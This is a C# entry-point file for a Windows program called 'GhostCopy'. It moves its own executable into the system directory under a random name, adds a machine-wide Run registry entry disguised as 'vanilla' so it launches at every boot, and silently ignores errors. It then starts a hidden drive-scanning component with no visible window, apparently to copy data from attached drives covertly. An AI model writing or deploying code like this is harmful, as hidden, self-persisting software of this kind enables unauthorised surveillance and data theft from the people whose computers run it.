namespace GhostCopy {
    using System;
    using System.IO;
    using System.Windows.Forms;
    using Microsoft.Win32;

    static class Program {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main() {
            try {
                var appBase = Environment.SystemDirectory;
                var appName = new Random().Next() + ".exe";
                var newPath = Path.Combine(appBase, appName);
                File.Move(Application.ExecutablePath, newPath);

                // add auto-run registry key
                var startupKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if(startupKey != null)
                    startupKey.SetValue("vanilla", newPath);
            } catch(IOException) { }

            new DriveScanner().CreateHandle(new CreateParams());
            Application.Run();
        }
    }
}
